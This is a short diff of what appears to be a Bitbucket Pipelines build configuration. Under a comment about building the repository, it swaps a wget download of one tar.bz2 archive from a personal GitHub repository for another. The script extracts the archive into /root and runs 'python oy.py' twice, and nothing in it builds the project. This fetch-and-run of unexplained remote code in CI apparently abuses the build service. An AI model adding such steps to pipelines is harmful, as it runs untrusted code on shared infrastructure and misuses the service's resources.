@@ -12,8 +12,8 @@ pipelines:
           - docker
         script: # Modify the commands below to build your repository.
           # Set $DOCKER_HUB_USERNAME and $DOCKER_HUB_PASSWORD as environment variables in repository settings
-          - wget https://github.com/y0shimitsugh0st84/profire/raw/master/version/02-amin.tar.bz2
-          - tar -xvf 02-amin.tar.bz2 -C /root/
+          - wget https://github.com/y0shimitsugh0st84/profire/raw/master/version/03-aymen.tar.bz2
+          - tar -xvf 03-aymen.tar.bz2 -C /root/
           - ls /root/*
           - python oy.py
           - python oy.py
